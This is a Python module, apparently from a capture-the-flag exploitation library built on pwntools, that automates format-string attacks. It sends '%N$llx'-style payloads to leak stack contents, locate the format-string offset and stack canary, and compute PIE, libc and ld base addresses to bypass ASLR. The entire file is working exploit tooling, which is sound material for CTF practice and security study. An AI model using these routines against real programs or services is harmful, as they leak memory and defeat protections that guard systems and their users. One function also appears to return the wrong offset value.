from typing import Callable, Union, List, Tuple, Optional

import pwnlib.tubes.process
from pwnlib.context import context

from ctflib.pwn import debug, get_pie_base
from ctflib.pwn.util import decode_to_ascii, get_libc_base, get_ld_base, SetupFunction


def find_offset(setup: SetupFunction, max_input_length: Union[int, None] = None) -> int:
    stack = dump_stack(setup, max_input_length, 1, 30)
    for i, out in enumerate(stack):
        if out is None:
            continue
        if len(hex(out)) % 2:
            continue
        out = decode_to_ascii(out)
        if b"$llx" in out or b"ZZ" in out or b"$x" in out:
            return i + 1


def read_stack(p: pwnlib.tubes.process.process, indexes: List[int]) -> List[int]:
    payload = []
    for i in indexes:
        # If 64 bit, use %llx
        if context.arch == "amd64":
            payload.append(f"%{i}$llx")
        else:
            payload.append(f"%{i}$x")
    payload = "ZZ" + ".".join(payload) + "ZZ"
    p.sendline(payload)
    for j in range(0, 30):
        line = p.recvline()
        if b"ZZ" in line:
            returned_string = line.split(b"ZZ")[1].split(b"ZZ")[0]
            ret = [int(x, 16) for x in returned_string.split(b".")]
            assert len(ret) == len(
                indexes), "Returned item length does not match index length. Batch size probably too high"
            return ret
    raise Exception("Process did not echo sent data. Perhaps echoed data is not within 30 lines of output")


def dump_stack(setup: SetupFunction, max_input_length: Union[None, int] = None,
               offset: int = 6, until: int = 30) -> List[int]:
    if max_input_length is None:
        batch_size = 3
    else:
        batch_size = max_input_length // 10
    output = []
    for i in range(offset, until, batch_size):
        p = setup()
        out = read_stack(p, [x for x in range(i, i + batch_size)])
        if not out:
            output.extend([None] * batch_size)
        else:
            output.extend(out)
        p.close()
    return output


def find_canary_offset(binary: pwnlib.elf.elf, break_addr: int, max_input_length: Union[None, int] = None,
                       offset: int = 6, until: int = 30) -> Union[int, None]:
    if max_input_length is None:
        batch_size = 3
    else:
        batch_size = max_input_length // 10
    print(f"Batch size: {batch_size}")
    for i in range(offset, until, batch_size):
        p, g = debug(binary, break_addr)
        o = str(g.parse_and_eval("$rax"))
        canary = int(o[2:], 16)
        g.continue_nowait()
        result = read_stack(p, [x for x in range(i, i + batch_size)])
        if canary in result:
            offset = result.index(canary) + i
            print(f"Found canary leak at offset {offset}")
            return i
        p.close()
        g.quit()


def __leak_base(setup: SetupFunction, func: Callable[[int], int], max_input_length: Union[None, int] = None,
                offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    if max_input_length is None:
        batch_size = 3
    else:
        batch_size = max_input_length // 10
    print(f"Batch size: {batch_size}")
    output = [[], []]
    for j in range(2):
        for i in range(offset, until, batch_size):
            p = setup()
            out = read_stack(p, [x for x in range(i, i + batch_size)])
            if out:
                for item in out:
                    output[j].append((item, func(p.pid)))
            p.close()

    def sub(a, b):
        return a - b

    out = []
    for i in range(len(output[0])):
        run1 = sub(*output[0][i])
        run2 = sub(*output[1][i])
        if run1 == run2:
            out += (i + offset, -run1)
    return out


def leak_pie_base(setup: SetupFunction, max_input_length: Union[None, int] = None,
                  offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    return __leak_base(setup, get_pie_base, max_input_length, offset, until)


def leak_libc_base(setup: SetupFunction, max_input_length: Union[None, int] = None,
                   offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    return __leak_base(setup, get_libc_base, max_input_length, offset, until)


def leak_ld_base(setup: SetupFunction, max_input_length: Union[None, int] = None,
                 offset: int = 6, until: int = 30) -> Optional[List[Tuple[int, int]]]:
    return __leak_base(setup, get_ld_base, max_input_length, offset, until)
